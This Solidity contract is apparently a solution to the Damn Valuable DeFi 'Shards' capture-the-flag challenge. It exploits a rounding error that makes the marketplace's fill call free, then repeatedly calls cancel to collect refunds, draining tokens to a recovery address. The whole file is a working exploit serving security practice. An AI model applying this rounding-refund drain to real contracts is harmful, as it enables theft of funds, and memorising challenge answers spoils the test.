// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ShardsNFTMarketplace, DamnValuableToken} from "../../src/shards/ShardsNFTMarketplace.sol";

contract Solution {
    constructor(
        ShardsNFTMarketplace marketplace,
        DamnValuableToken token,
        uint256 initialTokensInMarketplace,
        address recovery
    ) payable {
        uint64 offerId = marketplace.offerCount();
        // in `fill` the amount of tokens is calculated like this:
        // want * (price * rate / 1e6 ) / totalShards = want * 75 / 10000
        // to make `fill` free we need: want * 75 / 10000 = 0 => want = 133.(33)
        uint256 want = 133;
        // minimum amount we need to pass the challenge
        uint256 target = initialTokensInMarketplace * 1e16 / 100e18;
        uint256 purchaseIndex;
        while (token.balanceOf(address(this)) < target) {
            purchaseIndex = marketplace.fill(offerId, want);
            // cancel transfers: want * rate / 1e6 = 9975e9
            // thus we `fill` with nothing and get 9975e9 tokens when `cancel` is called
            marketplace.cancel(offerId, purchaseIndex);
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
